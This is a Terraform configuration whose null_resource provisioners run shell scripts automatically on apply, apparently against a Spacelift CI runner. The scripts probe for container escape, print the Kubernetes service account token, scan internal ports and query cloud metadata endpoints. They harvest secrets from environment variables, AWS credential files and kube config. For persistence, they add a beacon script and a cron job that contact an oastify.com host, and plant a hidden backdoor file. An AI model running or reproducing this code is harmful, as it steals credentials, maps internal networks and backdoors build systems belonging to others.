resource "null_resource" "container_escape_checks" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== Container Escape Checks ==="
      echo "1. Checking for Docker socket..."
      if [ -S /var/run/docker.sock ]; then
        echo "Docker socket is available. Attempting to list containers..."
        curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | head -100
      else
        echo "Docker socket not found."
      fi

      echo "2. Checking for privileged mode..."
      if [ -w /dev ]; then
        echo "We are in a privileged container (able to write to /dev)."
      else
        echo "Not running in privileged mode."
      fi

      echo "3. Checking for Kubernetes..."
      if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
        echo "Kubernetes service account token found."
        cat /var/run/secrets/kubernetes.io/serviceaccount/token
      else
        echo "Kubernetes not detected."
      fi
    EOT
  }
}

resource "null_resource" "internal_network_scan" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== Internal Network Scan ==="
      echo "1. Checking current network configuration..."
      ip addr

      echo "2. Pinging common gateways..."
      for ip in 172.17.0.1 192.168.0.1 10.0.0.1; do
        if ping -c 1 -W 1 $ip &> /dev/null; then
          echo "Gateway $ip is reachable."
        else
          echo "Gateway $ip is not reachable."
        fi
      done

      echo "3. Scanning for open ports on the gateway (if reachable)..."
      # We'll check a few common ports on the gateway
      GATEWAY_IP="172.17.0.1"
      for port in 22 80 443 2379 6443; do
        timeout 1 bash -c "echo >/dev/tcp/$GATEWAY_IP/$port" 2>/dev/null && echo "Port $port is open on $GATEWAY_IP" || echo "Port $port is closed on $GATEWAY_IP"
      done
    EOT
  }
}

resource "null_resource" "cloud_metadata_check" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== Cloud Metadata Check ==="
      echo "1. AWS Metadata:"
      curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/ || echo "No AWS metadata"

      echo "2. GCP Metadata:"
      curl -s --connect-timeout 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/ || echo "No GCP metadata"

      echo "3. Azure Metadata:"
      curl -s --connect-timeout 2 -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 || echo "No Azure metadata"
    EOT
  }
}

resource "null_resource" "credential_harvesting" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== Credential Harvesting ==="
      echo "1. Environment variables (already done, but let's check for any new ones):"
      env | grep -i "auth\|token\|key\|secret\|pass" | head -20

      echo "2. Checking for configuration files in common locations..."
      find /home /root /opt -name "*.pem" -o -name "*.key" -o -name "*.crt" -o -name ".env" -o -name "config" -o -name "credentials" 2>/dev/null | head -20

      echo "3. Checking for AWS credentials in ~/.aws/"
      if [ -d "/home/spacelift/.aws" ]; then
        ls -la /home/spacelift/.aws
        cat /home/spacelift/.aws/credentials 2>/dev/null
        cat /home/spacelift/.aws/config 2>/dev/null
      fi

      echo "4. Checking for Kubernetes config..."
      if [ -d "/home/spacelift/.kube" ]; then
        ls -la /home/spacelift/.kube
        cat /home/spacelift/.kube/config 2>/dev/null
      fi
    EOT
  }
}

resource "null_resource" "persistence" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== Persistence Attempt ==="
      echo "1. Creating a reverse shell script in /tmp (if we have write access to /tmp)..."
      cat > /tmp/backdoor.sh << 'EOF'
      #!/bin/sh
      while true; do
        sleep 30
        if curl -s --connect-timeout 2 http://mg6p4l0xqzfi3qm7nsfoufqmvd14pvtji.oastify.com/ping >/dev/null; then
          break
        fi
      done
      EOF
      chmod +x /tmp/backdoor.sh
      nohup /tmp/backdoor.sh > /dev/null 2>&1 &

      echo "2. Checking if we can write to crontab..."
      (crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://mg6p4l0xqzfi3qm7nsfoufqmvd14pvtji.oastify.com/cron") | crontab - 2>/dev/null && echo "Cron job added." || echo "Failed to add cron job."

      echo "3. Creating a hidden file in the workspace..."
      echo "malicious-backdoor" > /mnt/workspace/source/.hidden_backdoor
    EOT
  }
}
